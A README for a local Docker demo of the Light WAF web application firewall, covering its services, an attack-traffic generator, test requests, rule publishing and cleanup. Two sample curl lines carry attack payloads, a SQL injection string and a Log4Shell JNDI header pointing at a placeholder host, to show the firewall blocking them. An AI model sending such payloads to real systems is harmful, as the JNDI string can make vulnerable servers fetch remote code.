<!-- SPDX-License-Identifier: Apache-2.0 -->
# Light WAF — one-command demo

The WAF, its dashboard and a stream of demo attacks, running locally from the release images.
You need only Docker (with Compose v2).

```sh
cd demo
docker compose up
```

After about half a minute:

| What | Where |
|---|---|
| Dashboard | <http://localhost:9600> — user `admin`, password `lightwaf-demo` |
| The WAF (send your own requests) | <http://localhost:8080> |

Both are bound to `127.0.0.1` only.

## What runs

```
traffic ──▶ waf (:8080) ──▶ app          the request path
             │
             ├─ decision log ──▶ vector ──▶ controlplane (:9600) ◀── postgres
             ├─ captured requests ───────▶ controlplane
             └─ /metrics ◀────────────────  controlplane (scrapes)
agent ◀──── published rulesets ─────────── controlplane
```

| Service | Image | Role |
|---|---|---|
| `app` | `traefik/whoami` | The application behind the WAF: echoes every request back. |
| `waf` | `ghcr.io/0x00spor3/waf-enterprise` | The WAF. All detection modules on, curated CVE rules, full capture of denied requests. Config: [`waf.toml`](waf.toml). |
| `controlplane` + `postgres` | `ghcr.io/0x00spor3/waf-controlplane` | Dashboard and API, users and roles, signed audit log, alerting. Config: [`controlplane.toml`](controlplane.toml). |
| `vector` | `timberio/vector` | Ships the WAF's JSON decision log to the control plane. |
| `agent` | `ghcr.io/0x00spor3/waf-node-agent` | Applies rulesets published from the dashboard to the WAF. |
| `traffic` | `curlimages/curl` | Normal requests mixed with attacks — SQL injection, XSS, path traversal, command injection, SSRF, template injection, Log4Shell, NoSQL, XXE, scanners — from made-up client addresses. About every 45 seconds a "scanner" bursts, which fires the alerts. Script: [`traffic.sh`](traffic.sh). |

## Things to try

**Look at a verdict.** In **Events**, open a blocked request: the score bar and the breakdown show
which rules matched and how many points each added. *Reveal captured request* shows the full
request as the WAF received it (the reveal is recorded in **Audit**).

**Send your own requests.**

```sh
curl -i "http://localhost:8080/search?q=shoes"                                  # 200, forwarded
curl -i "http://localhost:8080/search?q=1%27%20OR%20%271%27=%271"               # 403, SQL injection
curl -i "http://localhost:8080/" -H 'X-Api-Version: ${jndi:ldap://x.example/a}'  # 403, Log4Shell
```

To watch only your own traffic, stop the generator: `docker compose stop traffic`.

**Publish a rule.** In **Rules**, publish this ruleset:

```
SecRule REQUEST_URI "@contains /internal-admin" "id:9100,phase:1,deny,status:403,msg:'Block /internal-admin',severity:CRITICAL"
```

Within a few seconds the node shows `applied` under *Node convergence*, and
`curl -i http://localhost:8080/internal-admin` returns 403. Publish something invalid and the
node reports `rejected` — the WAF keeps the previous ruleset.

**Watch it observe instead of block.** Set `mode = "detection-only"` in [`waf.toml`](waf.toml) and
run `docker compose restart waf`: requests are scored and logged but always forwarded.

## Stop and clean up

```sh
docker compose down       # stop, keep the data
docker compose down -v    # stop and delete the data (Postgres, rules)
```

## Not for production

This stack is for trying Light WAF on your machine. It uses fixed passwords, a fixed audit-log key
and a fixed API token; the Vector container reads the Docker socket; and the WAF trusts
`X-Forwarded-For` from any private address so that the traffic generator can play several
clients. For a real deployment, see the [documentation](../docs/README.md) — in particular
[getting started](../docs/02-getting-started.md) and [Kubernetes](../docs/09-kubernetes.md).
